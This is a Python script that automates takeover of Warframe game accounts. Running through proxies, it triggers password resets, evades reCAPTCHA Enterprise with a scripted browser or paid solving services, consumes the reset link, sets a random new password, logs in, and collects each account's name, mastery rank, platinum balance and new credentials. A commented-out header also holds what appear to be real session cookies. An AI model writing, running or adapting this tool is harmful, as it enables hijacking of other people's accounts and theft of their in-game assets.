import requests
from pyppeteer import launch
import asyncio
import random
from Naked.toolshed.shell import muterun_js
import time
from anticaptchaofficial.recaptchav3enterpriseproxyless import *
from bs4 import BeautifulSoup


class Warframe:
    def __init__(self, email, proxy):
        self.email = email
        self.session = requests.session()
        self.proxy = proxy
        self.session.proxies.update(self.proxy)
        #print(self.session.get("https://api.ipify.org?format=json").text)
        self.csrf_token = None
        self.headers = {
            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua-mobile': '?0',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
            'sec-ch-ua-platform': '"Windows"',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://www.warframe.com/landing',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            #'Cookie': "bm_sz=5FABD4C80DA6B5A04658FE5CFB20A325~YAAQJmAVAt7fCkCDAQAAlF3SQhGAhoZcHcRiPZkfSYwhMP5e63/X17NYwP3xrqL/5u353Av79nR3QhgZTtGHG5u7LWaLOgpH4j+iQDSWxyh1LgvE2Xo/gngSQkoXylYBoyPc88ZJuKHzuApBpRrDvEKFEqGitBHCM45NcLY4QLk3sP4oJ4WhupFjFvJAu7cgNX9aPvx1Sl3Mn9NJKe7O9/jLHg8FyQQsKPfNDyto1Dgutwyz196OXRT8dd9EbXZwcJ9Yh7MMCutvjN8QwKyvhA+nSCRUvDZhH2fAHY9pHuOEo9qWRw==~3486771~3291457; landing=1; warframe_session=xM2VL5Ahni4BmgegSfCDq6g3kvUeO9Uvq0Bp7c2n; ak_bmsc=E7136695FB3218624C895307F33C2685~000000000000000000000000000000~YAAQJmAVAvXfCkCDAQAAhGbSQhEyYu/7g3LK3FCwoS6JrHpsS3KvLcC3pEayR6R6e3KpwKwM7ai14Brfn4wVTT0BxKE4M81BbCRjv/Fw+sTy/oFvY2IRFWbuGpnouKU5Y52V7z59ZovRK2PdPar85AjW+p5aL2Jdiwz62W3XbHl2jVcWY49d9iFMTVGVCr/Yl1sjC7j08bhuFSWHC5vo2sSTs8uocHUTk9tHixKphnzj3o9Ifhbn7xbu8ZC/nHSFJghPh9AuuvLaTUSu1PcIqMRnUXPROjzxzGS13wyzIdqIcDkOlyryoeaJDLs88sl//DbByG9iRr4dbIvOMmpqcZkRIoBwY/4a4d6McvEsQGUod2J/1LX6a+dLiI51e3M1lz6CD+CRXpalJIVulHvT+/ytlZEZFgvSPjdBPJKQKbgkZrshSHUyMprdt1aS8x2BK0KvrJUKW32CAj5mKpJhxn0Zlv2AjF+QkahMhhaDRGtBzZw=; _abck=F838A898464C745BB2146E4404A04823~0~YAAQJmAVAvzfCkCDAQAAfm3SQghDXSmv8qRK9/CcT7cj6d1mxS80qw762sMjrEO8jfYKsdOkQN0KB3PQEjF6U3f7bMy3VAPt3JnmZ++wANfj3E0fDaIy8D7onCThauGFa0/uhNeDPbhI7LWHNg4HzXYUutF/qIYWoxEzZ+Sjt1VJGQFj2nTimCzhc1WGWAwBlp9R3krpQ1B6EI9aZjhFlIq1I0lPkw2yFyLEZBCNUVB1iaRS5nWNLHgR+S5k1mvBJGi/Ud3TAcaj2nmfLa4m6nfdTiLcHVt9fWU2f4vYM5EP9WP5TFiq9KQomw5Q++aZ6F0wrlZhvUAyl+atxz7prxl8e6qkYRh7BkZ4sE51khKO/WwJB+9YdDJyq21LJ9S+JR/yiTndqcFaRxeplwpzdGH4Mld5CcQ=~-1~-1~-1; language=en; OptanonConsent=isGpcEnabled=0&datestamp=Thu+Sep+15+2022+23%3A23%3A56+GMT%2B0300+(Moscow+Standard+Time)&version=6.24.0&isIABGlobal=false&hosts=&consentId=b02f975f-3810-4b09-bad2-2643c98403e2&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A0%2CC0003%3A0%2CC0004%3A0&AwaitingReconsent=false; XSRF-TOKEN=eyJpdiI6IlljWHVYWG42RjdyOVZWVFFMdTVGM3c9PSIsInZhbHVlIjoiQ21ObFdveEI4QURJekVUZ3Q5aWdqZjh5bGJoVUtNSG9Tb0I0RnRoUkNkeTY2Mzl0RERObUpqUWtDSFRYKzFlWXFYVWhiR1ROMWh1cVZ1N25CdTBPaklmOUNrbk5CbmFSMW9ydTVDRFg0YUQwRDZNanZNdklzbm9oT21SaUdvR3UiLCJtYWMiOiJhZjQ3Njc5NWUwMWQ1NDZkZWMyNTljMDlkN2JmYTExZDUyZDRmMTg0M2E3NTA4NGU1NmMzMGM4Y2E5YTdmZGIzIn0%3D; bm_sv=E20C3AB28C06D63E4687D612851C4665~YAAQJmAVAhjgCkCDAQAABoPSQhGROjEg7qIxaUSmauOtrK12q6Mk11SYGzCAs36/HPJfofFFuaC2p+rO1Ewqqw0PqyIahWPI76XcpSIhK89IqO8J4d3WFW+YLCZHmVRjzL7Jf8FMI4tp+mXEFiPhsq9869sdGln+1ifsTYkWSyiraufu/TjkqICZOCRVPbtvCf8/rIH+MufJSrRQ2zOgC8pBOR9G3+rI0oo3FYBnOp0lBHrQT6+o7iV4kO4VkYv26pA=~1"
        }
        self.get_csrf_token()

    def get_csrf_token(self):
        resp = self.session.get("https://www.warframe.com/en/api/user-data", headers=self.headers)
        self.csrf_token = resp.json()['csrf']
        self.headers['Cookie'] = f"warframe_session={resp.cookies['warframe_session']};"


    def get_account_data(self):
        resp = self.session.get("https://www.warframe.com/en/api/user-data", headers=self.headers).json()
        return {"name": resp['display_name'], "masteryRank": resp['account']['masteryRank'], "platinum": resp['account']['platinum']}

    def make_recovery(self):
        for i in range(10):
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                captcha_token = asyncio.get_event_loop().run_until_complete(solve_captcha(self.proxy, "forgotpw"))
                #captcha_token = solve_captcha_anticaptcha()
                #captcha_token = self.solve_rucaptcha("forgotpw")
                print(captcha_token)
                if captcha_token is not None:
                    params = {
                        'email': self.email,
                        'g-recaptcha-response': captcha_token,
                        '_token': self.csrf_token
                    }
                    resp = self.session.post("https://www.warframe.com/resetpassword", params=params, headers=self.headers,
                                         allow_redirects=True)
                    soup = BeautifulSoup(resp.text, "html.parser")
                    try:
                        #print(soup.find_all("div", {"class": "alert"})[0].find_all("li")[0].text)
                        print("ReCaptcha Error")
                        return False
                    except:
                        print("Captcha bypassed")
                        return True
            except Exception as err:
                print(err)
                continue

    def confirm_recovery(self, link):
        resp = self.session.get(link, allow_redirects=False, headers=self.headers)
        soup = BeautifulSoup(resp.text, "html.parser")
        link = soup.find_all("a")[0]['href']
        conf, nonce = link.replace("https://www.warframe.com/resetpassword/confirm?conf=", "").split("&")
        nonce = nonce.replace("nonce=", "")
        #print(conf, nonce, link)
        resp = self.session.get(link, headers=self.headers)
        #print(resp.cookies)
        self.headers['Cookie'] = f"warframe_session={resp.cookies['warframe_session']};"
        self.get_csrf_token()
        new_password = ''.join([random.choice(random.choice([['a', 'e', 'f', 'g', 'h', 'm', 'n', 't', 'y'],
                                                             ['A', 'B', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N',
                                                              'Q', 'R', 'T', 'X', 'Y'],
                                                             ['2', '3', '4', '5', '6', '7', '8', '9'],
                                                             ['/', '*', '+', '~', '@', '#', '%', '^', '&', '//']])) for
                                i in range(16)])
        params = {
            'password': new_password,
            'confirm':  new_password,
            '_token':   self.csrf_token,
            'conf':     conf,
            'nonce':    nonce,
        }
        resp = self.session.post("https://www.warframe.com/resetpassword/confirm", headers=self.headers, params=params)
        soup = BeautifulSoup(resp.text, "html.parser")
        if "You have successfully changed your password!" in soup.find_all("div", {"class": "alert"})[0].text.replace(
                "\n", ""):
            for i in range(10):
                captcha_token = asyncio.get_event_loop().run_until_complete(solve_captcha(self.proxy, "login"))
                #captcha_token = solve_captcha_anticaptcha()
                #captcha_token = self.solve_rucaptcha("login")
                print(captcha_token)
                if captcha_token is not None:
                    params = {
                            '_token':               self.csrf_token,
                            'email':                self.email,
                            'password':             new_password,
                            '_token':               self.csrf_token,
                            'g-recaptcha-response': captcha_token
                    }
                    self.session.get("https://www.warframe.com/login")
                    resp = self.session.post("https://www.warframe.com/login", headers=self.headers, params=params, allow_redirects=False)
                    self.headers['Cookie'] = f"warframe_session={resp.cookies['warframe_session']};"
                    resp = self.session.get("https://www.warframe.com/", headers=self.headers)
                    soup = BeautifulSoup(resp.text, "html.parser")
                    try:
                        if "You are already logged in!" in soup.find_all("div", {"class": "alert"})[0].text.replace("\n",
                                                                                                                    ""):
                            #print("Logged IN!!!")
                            print("Captcha Bypassed")
                            data = self.get_account_data()
                            data['password'] = new_password
                            data['email'] = self.email
                            return data
                        else:
                            #print(soup.find_all("div", {"class": "alert"}))
                            #print("Error with login")
                            print("Recaptcha")
                            pass
                    except:
                        #print(resp.text)
                        pass
            return None
        else:
            return None


async def solve_captcha(proxy, action):
    proxy = proxy['https'].replace("http://", "")
    auth_data, ip_data = proxy.split("@")
    username, password = auth_data.split(":")
    browser = await launch({'args': [f'--proxy-server={ip_data.replace("/", "")}'], 'headless': False})
    #browser = await launch({'headless': True})
    try:
            page = await browser.newPage()
            await page.authenticate({'username': username, 'password': password})
            await page.goto('https://www.warframe.com/resetpassword')
            input()
            script = '''grecaptcha.enterprise.execute("6LcWYwYgAAAAAIw9zG71CAPMr2oJPm3zpiaCXLVj", {action: "forgotpw"}).then(function(token) {
                            return token
                        });'''
            script = script.replace("forgotpw", action)
            token = await page.evaluate(script)
            await browser.close()
            return token
    except:
        await browser.close()
        return None


def solve_captcha_js(proxy):
    proxy = proxy['https'].replace("http://", "")
    auth_data, ip_data = proxy.split("@")
    username, password = auth_data.split(":")
    proxy = f"{ip_data.replace('/', '')} {username} {password}"
    captcha_token = muterun_js('nodejs\\getCaptcha.js', proxy).stdout.decode().replace("\n", "")
    return captcha_token


def solve_captcha_anticaptcha():
    solver = recaptchaV3EnterpriseProxyless()
    solver.set_verbose(1)
    solver.set_key("APIKEY")
    solver.set_website_url("https://www.warframe.com/")
    solver.set_website_key("6LcWYwYgAAAAAIw9zG71CAPMr2oJPm3zpiaCXLVj")
    solver.set_page_action("forgotpw")
    solver.set_min_score(0.9)
    solver.set_soft_id(0)

    g_response = solver.solve_and_return_solution()
    if g_response != 0:
        return g_response
    else:
        return None